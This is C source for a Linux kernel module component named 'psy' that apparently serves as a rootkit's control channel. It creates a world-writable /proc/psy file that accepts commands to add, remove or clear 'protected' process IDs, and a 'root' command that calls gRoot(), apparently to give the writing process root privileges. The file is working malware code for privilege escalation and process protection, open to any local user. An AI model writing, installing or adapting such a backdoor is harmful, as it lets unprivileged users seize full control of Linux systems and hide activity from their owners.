#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>

#include "inc/cmds.h"
#include "inc/util.h"

MODULE_LICENSE("GPL");

#define PROC_NAME "psy"

static struct proc_dir_entry *proc_entry = NULL;

static int proc_show(struct seq_file *m, void *v)
{
  pid_node_t *cur = protected_pids_head;
  seq_printf(m, "[⚡︎] Protected PIDs:\n");
  while (cur)
    {
      seq_printf(m, "%d\n", cur->pid);
      cur = cur->next;
    }
  return 0;
}

static int proc_open(struct inode *inode, struct file *file)
{
  return single_open(file, proc_show, NULL);
}

static ssize_t proc_write(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos)
{
  char cmd[32];
  int pid;

  if (count > 31) return -EINVAL;
  if (copy_from_user(cmd, buffer, count)) return -EFAULT;
  cmd[count] = '\0';
  if (sscanf(cmd, "add %d", &pid) == 1)
    {
      addPid(pid);
    }
  else if (sscanf(cmd, "del %d", &pid) == 1)
    {
      removePid(pid);
    }
  else if (strncmp(cmd, "clear", 5) == 0)
    {
      clearProtected();
    }
  else if (strncmp(cmd, "root", 4) == 0)
    {
      gRoot();
    }
  
  return count;
}

static const struct proc_ops proc_fops = {
    .proc_open    = proc_open,
    .proc_read    = seq_read,
    .proc_write   = proc_write,
    .proc_lseek   = seq_lseek,
    .proc_release = single_release,
};

bool cInstall(void)
{
  proc_entry = proc_create(PROC_NAME, 0666, NULL, &proc_fops);
  if (!proc_entry)
    {
      printk(KERN_ERR "psy: failed to create procfs entry\n");
      return false;
    }
  printk(KERN_INFO "psy: procfs interface created in /proc/%s\n", PROC_NAME);
  return true;
}

void cUninstall(void) {
    if (proc_entry) {
        remove_proc_entry(PROC_NAME, NULL);
        proc_entry = NULL;
    }
    printk(KERN_INFO "psy: procfs interface removed\n");
}
